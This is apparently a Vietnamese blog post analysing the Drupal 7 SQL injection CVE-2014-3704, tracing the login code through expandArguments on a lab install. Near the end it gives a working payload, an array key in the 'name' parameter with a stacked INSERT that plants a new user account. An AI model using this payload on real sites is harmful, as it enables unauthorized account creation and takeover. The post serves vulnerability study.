# BÀI PHÂN TÍCH THÁNG 7

## I. Đôi lời về CVE-2014-3704

Trong quá trình làm dự án thì mình dùng nmap để scan, thì phát hiện thấy vài chiếc dự án mình làm đều dính CVE-2014-3704. May thay đang thiếu idea viết bài phân tích nên mình dùng luôn :D

CVE này liên quan đến lỗi SQL injection, một lỗi rất phổ biến và có thể gây ra impact nghiêm trọng nếu như chúng ta khai thác đủ sâu. 

Để khai thác lỗ hổng này thì mình chọn sản phẩm là Drupal core version 7.x -> 7.31.

Đại khái CVE-2014-3704 này là do `expandArguments` function code lỗi, cho phép kẻ tấn công thực hiện SQLi bằng cách nhập array vào.

## II. Demo

1. Đầu tiên down source [**drupal 7.31**](https://www.drupal.org/project/drupal/releases/7.31) về, cài đặt lên
2. Nhưng do mình debug ngu hay như nào thì mình không thể cài đặt được trên máy mình nên mình sử dụng cách khác, đó là dùng docker: [**https://hub.turbo.net/run/drupal/drupal-7.31**](https://hub.turbo.net/run/drupal/drupal-7.31)
3. Vẫn phải debug 1 chút nhưng nó đơn giản hơn 🙂.
4. Đây là màn hình chính của nó:

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled.png)

1. Thử đổi biến `name` thành dạng array.

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled%201.png)

1. Đầy là hàm authen khi ta login.
    
    Khi gọi function `db_query` nhận vào query là `"SELECT * FROM {users} WHERE name = :name AND status = 1"` và mảng với key là `:name`
    

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled%202.png)

1. Đây là hàm db_query, nhận thấy hàm này gọi đến hàm `query`

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled%203.png)

1. Cặp try else thứ nhất gọi hàm `expandArguments` với các tham số đi vào giống như khi đi vào đi vào hàm `db_query` ở trên.

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled%204.png)

1. Nếu hoạt động như bình thường `( ?name=test )`, thì không có gì xảy ra, login bình thường, nhưng ở trong vòng lặp foreach, nếu trong `args` là array, thì nó sẽ được “expand” và nối lại dưới dạng `$new_keys[$key . '_' . $i] = $value;` sẽ được replace vào câu query: $query = preg_replace('#' . $key . '\b#', implode(', ', array_keys($new_keys)), $query); 

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled%205.png)

1. Khi input `name[e]=tsu&name[y]=tsu2`, câu query sẽ trở thành:

![Untitled](BA%CC%80I%20PHA%CC%82N%20TI%CC%81CH%20THA%CC%81NG%207%207ed66a1d429b41cf85c74e4e055ee7eb/Untitled%206.png)

1. 

Vậy sẽ thế nào khi sửa

```
name[e]
```

thành

```
name[0;insert into users values (99999,'tsuhihi','$S$DpPaNHY90R5mQ.O5jkVIyT3PjPLcVvLEcsZ1sVZ5X5onytapTfkk','hacked@gmail.com','','',NULL,0,0,0,1,NULL,'',0,'',NULL);#]
```

, câu query sẽ thành

```
SELECT * FROM {users} WHERE name = :0;insert into users values (99999,'tsuhihi','$S$DpPaNHY90R5mQ.O5jkVIyT3PjPLcVvLEcsZ1sVZ5X5onytapTfkk','hacked@gmail.com','','',NULL,0,0,0,1,NULL,'',0,'',NULL);#, :name_0 AND status = 1
```

Drupal sử dụng PDO nên có thể chạy được SQL stack query nên có thể tạo user quyền admin và từ đó có quyền pwned.